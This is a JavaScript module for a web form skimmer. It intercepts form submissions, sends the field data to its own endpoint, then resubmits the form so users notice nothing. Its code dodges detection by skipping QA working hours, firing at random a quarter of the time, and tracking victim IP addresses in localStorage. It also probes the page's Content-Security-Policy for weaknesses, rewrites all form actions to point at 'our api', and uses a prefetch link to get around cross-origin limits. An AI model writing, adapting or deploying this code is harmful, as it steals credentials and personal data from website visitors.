import * as _ from 'lodash';
import { config } from './config';
import { sendRequest, getIpAddress, createUrl } from './requestHelpers';

const KEY = 'knownIpAddresses';

/**
 * Check the various safety nets and if they all pass, send off our request
 * @param {Event} e The form submit event that triggered this
 * @param {HTMLFormElement} formElement the form element that we can resubmit
 */
export const harvest = async (e, formElement) => {
  e.preventDefault(); // prevent the form from submitting before we are done harvesting

  if (config.QA_MIGHT_BE_WORKING) {
    if (isQaWorking()) {
      return;
    }
  }

  if (config.HAVE_SENT) {
    if (await alreadyHaveDevice()) {
      return;
    }
  }

  if (config.RANDOMIZE) {
    // Only send the request 25% of the time
    const random = Math.floor(Math.random() * 4); // returns number between 0 and 3
    if (random !== 3) {
      return;
    }
  }

  const crossOriginPolicy = await checkCsp();
  // if(crossOriginPolicy.IsNotVeryGood){
  //   hijackFormActions();
  //   return true;
  // }
  // bypassCrossOriginPolicy();
  await updateKnownUsers();
  await sendRequest(e);

  clearListenersAndSubmit(formElement);
};

/**
 * Clear the form elements submit event listener
 * @param {HTMLFormElement} formElement The form element to clear
 */
const clearListenersAndSubmit = (formElement) => {
  formElement.removeEventListener('submit', harvest);
  formElement.submit();
};

/**
 * Are the Chrome Dev Tools open? We may not want to send the request
 */
const areDevToolsOpen = () =>
  // All (known) methods to detect if Chrome dev tools are open appear to be patched
  false;
const isQaWorking = () => {
  const d = new Date(); // current time
  const hours = d.getHours();
  const day = d.getDay();

  const isWeekday = day >= 1 && day <= 5;
  const isBetween7And7 = hours >= 7 && hours <= 19;

  return isWeekday && isBetween7And7;
};

/**
 * Sets the localstorage with our known users
 */
const updateKnownUsers = async () => {
  const knownDevices = JSON.parse(localStorage.getItem(KEY)) || [];
  const ipAddress = await getIpAddress();

  if (!ipAddress || _.includes(knownDevices, ipAddress)) return;
  knownDevices.push(ipAddress);
  localStorage.setItem(KEY, JSON.stringify(knownDevices));
};

/**
 * Have we already harvested the information for this user?
 */
const alreadyHaveDevice = async () => {
  let knownDevices = JSON.parse(localStorage.getItem(KEY));

  if (!knownDevices) {
    knownDevices = [];
  }
  const ipAddress = await getIpAddress();
  return _.includes(knownDevices, ipAddress);
};

/**
 * If we have deemed the action to be safe after examining the CSP,
 * we can hijack the forms to call our api instead of whatever it was originally supposed to do.
 * @param {string} encodedPayload The base64 encoded form field data
 */
const hijackFormActions = (encodedPayload) => {
  _.forEach(document.forms, (form) => {
    form.action = createUrl(encodedPayload);
  });
};

/**
 * Makes a request to the current page and examines the Content-Security-Policy.
 * You can perform checks here to see if there are any holes you can take advantage of.
 */
const checkCsp = async () => {
  const response = await fetch(document.location.href);
  const csp = response.headers.get('Content-Security-Policy');
  // Does this exist? Is it any good? perform analysis here
  return csp;
};

/**
 * This apparently bypasses cross origin policy (Chrome only - might be patched)
 */
const bypassCrossOriginPolicy = (apiUrl) => {
  const linkEl = document.createElement('link');
  linkEl.rel = 'prefetch';
  linkEl.href = apiUrl;
  document.head.appendChild(linkEl);
};
